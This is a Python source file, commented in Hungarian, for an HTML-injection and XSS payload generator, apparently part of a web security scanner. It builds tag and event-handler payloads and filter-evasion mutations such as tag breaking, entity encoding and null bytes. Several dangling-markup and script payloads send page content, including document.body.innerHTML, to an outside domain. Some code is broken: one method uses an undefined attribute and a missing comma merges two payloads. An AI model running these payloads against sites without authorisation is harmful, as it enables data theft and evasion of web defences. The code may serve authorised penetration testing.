import random
import re
import string
import urllib.parse


class HTMLInjectionPayloadGenerator():
    def __init__(self):
        
        self.base_payloads = set()
        self.mutated_payloads = set()
      
        self.possible_results = set()    # Várható eredmények a response-ból (sikeres injekciók és reflektált stringek)
        self.domain = ""
        self.unique_string = ""

        self.html_tags = ["a", "a2", "abbr", "acronym", "address", "animate", "animatemotion", "animatetransform", "applet", "area", "article", "aside", "audio", "audio2", "b", "bdi", 
                          "bdo", "big", "blink", "blockquote", "body", "br", "button", "canvas", "caption", "center", "cite", "code", "col", "colgroup", "command", "content", "custom tags", "data", 
                          "datalist", "dd", "del", "details", "dfn", "dialog", "dir", "div", "dl", "dt", "element", "em", "embed", "fieldset", "figcaption", "figure", "font", "footer", "form", "frame", 
                          "frameset", "h1", "head", "header", "hgroup", "hr", "html", "i", "iframe", "iframe2", "image", "image2", "image3", "img", "img2", "input", "input2", "input3", "input4", "ins", 
                          "kbd", "keygen", "label", "legend", "li", "link", "listing", "main", "map", "mark", "marquee", "menu", "menuitem", "meta", "meter", "multicol", "nav", "nextid", "nobr", "noembed", 
                          "noframes", "noscript", "object", "ol", "optgroup", "option", "output", "p", "param", "picture", "plaintext", "pre", "progress", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp", 
                          "script", "section", "select", "set", "shadow", "slot", "small", "source", "spacer", "span", "strike", "strong", "style", "sub", "summary", "sup", "svg", "table", "tbody", "td", "template", 
                          "textarea", "tfoot", "th", "thead", "time", "title", "tr", "track", "tt", "u", "ul", "var", "video", "video2", "wbr", "xmp"]

        self.html_events = ["onafterprint", "onafterscriptexecute", "onanimationcancel", "onanimationend", "onanimationiteration", "onanimationstart", "onauxclick", "onbeforecopy", "onbeforecut", "onbeforeinput", "onbeforeprint", "onbeforescriptexecute",
                             "onbeforetoggle", "onbeforeunload", "onbegin", "onblur", "oncancel", "oncanplay", "oncanplaythrough", "onchange", "onclick", "onclose", "oncontentvisibilityautostatechange", "oncontentvisibilityautostatechange(hidden)", "oncontextmenu", 
                             "oncopy", "oncuechange", "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter", "ondragexit", "ondragleave", "ondragover", "ondragstart", "ondrop", "ondurationchange", "onend", "onended", "onerror", "onfocus", "onfocus(autofocus)", 
                             "onfocusin", "onfocusout", "onformdata", "onfullscreenchange", "onhashchange", "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload", "onloadeddata", "onloadedmetadata", "onloadstart", "onmessage", "onmousedown", "onmouseenter", 
                             "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup", "onmousewheel", "onmozfullscreenchange", "onpagehide", "onpageshow", "onpaste", "onpause", "onplay", "onplaying", "onpointercancel", "onpointerdown", "onpointerenter", 
                             "onpointerleave", "onpointermove", "onpointerout", "onpointerover", "onpointerrawupdate", "onpointerup", "onpopstate", "onprogress", "onratechange", "onrepeat", "onreset", "onresize", "onscroll", "onscrollend", "onscrollsnapchange", "onsearch", 
                             "onseeked", "onseeking", "onselect", "onselectionchange", "onselectstart", "onshow", "onsubmit", "onsuspend", "ontimeupdate", "ontoggle", "ontoggle(popover)", "ontouchend", "ontouchmove", "ontouchstart", "ontransitioncancel", "ontransitionend", 
                             "ontransitionrun", "ontransitionstart", "onunhandledrejection", "onunload", "onvolumechange", "onwaiting", "onwaiting(loop)", "onwebkitanimationend", "onwebkitanimationiteration", "onwebkitanimationstart", "onwebkitfullscreenchange", 
                             "onwebkitmouseforcechanged", "onwebkitmouseforcedown", "onwebkitmouseforceup", "onwebkitmouseforcewillbegin", "onwebkitplaybacktargetavailabilitychanged", "onwebkitpresentationmodechanged", "onwebkittransitionend", "onwebkitwillrevealbottom", "onwheel"]


        self.change_spaces = False
        self.url_encode_payloads = False
        self.include_id = False
        self.custom_payloads = ['alert(1)']
        self.tag_break = False
        self.null_byte = False
        self.set_src = False

    def get_html_tags(self):
        result = [f"<{t}>" for t in self.html_tags] 

        return list(set(self.mutate(result)))

    def get_html_attributes(self):
        result = self.html_events
    
        return list(set(self.mutate(result)))

    def generate_all_tags_all_attributes(self):
        result =  [f"<{t} {e}=PAYLOAD>X" for t in self.html_tags for e in self.html_events]

        return list(set(self.mutate(result)))



    def generate_common_payloads(self):

        # Alap HTML Injection payloadok (ID-val és anélkül)
        self.base_payloads = {
            f"<b id='{self.unique_string}'>{self.unique_string}</b>",
            f"<img id='{self.unique_string}' src=x />",
            f"<div id='{self.unique_string}'>{self.unique_string * 3}</div>",
            f'"><b id="{self.unique_string}">{self.unique_string}</b>',
            f"'><b id='{self.unique_string}'>{self.unique_string}</b>",
            f"<svg/id={self.unique_string}>",
            f"<svg id='{self.unique_string}'>",
            f"<s>{self.unique_string}</s>",
            f"<s id='{self.unique_string}'>{self.unique_string}</s>",
            f"<s/id='{self.unique_string}'>{self.unique_string}</s>"
            f"<h1/id={self.unique_string}>"
        }

        # Dangling Markup Injection Payloadok Távoli Adatküldéssel és Nem Lezárt Tag Manipulációval
        self.base_payloads.update({
            # Automatikus adatküldés különböző tagekkel
            f"<img src='http://{self.domain}/?d={self.unique_string}'>",
            f"<a href='http://{self.domain}/?d={self.unique_string}'>Click me!</a>",
            f"<iframe src='http://{self.domain}/?d={self.unique_string}'></iframe>",
            f"<link rel='stylesheet' href='http://{self.domain}/?d={self.unique_string}'>",

            # Nem lezárt tagek, amelyek a DOM-ot manipulálják és küldik el
            f"<div><img src='http://{self.domain}/?r={self.unique_string}&d=",  # Nem lezárt img tag
            f"<div><a href='http://{self.domain}/?r={self.unique_string}&d=",  # Nem lezárt link
            f"<div><iframe src='http://{self.domain}/?r={self.unique_string}&d=",  # Nem lezárt iframe

            # JavaScript alapú DOM elküldés
            f"<script>fetch('http://{self.domain}/?d='+document.body.innerHTML)</script>",
            f"<body onload='fetch(\"http://{self.domain}/?d=\"+document.body.innerHTML)'>",

            # Textarea korai lezárása és adatküldés
            f"</textarea><img src='http://{self.domain}/?d={self.unique_string}'>",

            # Attribútum manipuláció eseménykezelőkkel
            f"' onmouseover='fetch(\"http://{self.domain}/?d={self.unique_string}\")'",
        })

        # Payloadok összegyűjtése és WAF bypass mutációk alkalmazása
        for payload in self.base_payloads:
            self.mutated_payloads.add(payload)
            self.apply_waf_bypass(payload)

        return list(set(self.mutated_payloads))

  
    def apply_waf_bypass(self, payload):
        """Apply WAF bypass techniques to HTML Injection payloads."""
        
        self.mutated_payloads.add(payload.replace('<', '<scr<script>ipt>'))  # Tag breaking
        unicode_encoded = ''.join(f'&#x{ord(c):x};' if c.isalnum() else c for c in payload)
        self.mutated_payloads.add(unicode_encoded)
        null_byte_injection = payload.replace('>', '\x00>')
        self.mutated_payloads.add(null_byte_injection)
        self.mutated_payloads.add(payload.replace('>', '><!--bypass-->'))

    def collect_possible_results(self):
            """Collect all possible outputs for detection, including reflected strings and injected IDs."""
            self.evidence_strings.append(self.unique_string)
            repeated_string = self.unique_string * 3
            self.evidence_strings.append(repeated_string)
            self.evidence_strings.append(f"id='{self.unique_string}'")
            self.evidence_strings.append(self.unique_string)

            # Dangling markup és adatküldés URL-ek
            self.evidence_strings.append(f"http://{self.domain}/?d={self.unique_string}")
            self.evidence_strings.append(f"<img src='http://{self.domain}/?d={self.unique_string}'>")
            self.evidence_strings.append(f"<iframe src='http://{self.domain}/?d={self.unique_string}'>")
            self.evidence_strings.append(f"<script>fetch('http://{self.domain}/?d='+document.body.innerHTML)</script>")

    def tag_breaking(self, tag):
        if " " in tag:
            tag_name, tag_rest = tag.split(" ",1)
            join_char = " "
            tag_name = tag_name.replace("<","")
            tag_name_len = len(tag_name)
            insertion_point = int(tag_name_len / 2)
            tag_name = "<"+tag_name[:insertion_point] + "<"+tag_name+">"+tag_name[insertion_point:]
  
        elif "/" in tag:
            tag_name, tag_rest = tag.split("/",1)
            join_char = "/"
            tag_name = tag_name.replace("<","")
            tag_name_len = len(tag_name)
            insertion_point = int(tag_name_len / 2)
            tag_name = "<"+tag_name[:insertion_point] + "<"+tag_name+">"+tag_name[insertion_point:]
  
        else:
            tag_name = tag
            tag_rest = ""
            join_char = ""
            tag_name_len = len(tag_name)
            insertion_point = int(tag_name_len / 2)    
            tag_name = tag_name[:insertion_point] + tag_name +tag_name[insertion_point:]
  

        return join_char.join([tag_name, tag_rest])



    def mutate(self, lista):

        if self.custom_payloads:
            lista = [l.replace("PAYLOAD", p) for l in lista for p in self.custom_payloads]

        if self.set_src:
            src_lista = [l.replace(">", f" src=x>") for l in lista for s in ['embed', 'iframe', 'audio', 'img', 'input', 'script', 'source', 'track', 'video'] if s in l] 
            lista = list(set(lista+src_lista))

        if self.include_id:
            lista = [l.replace(">", f" id={self.unique_string}>") for l in lista] 

        if self.tag_break:
            lista = [self.tag_breaking(l) for l in lista]

        if self.change_spaces:
            lista = [l.replace(" ", "/") for l in lista]    
        
        if self.null_byte:
            lista = [l.replace('>', '\x00>') for l in lista]

        if self.url_encode_payloads:
            lista =  [urllib.parse.quote(l) for l in lista]
         

        return lista

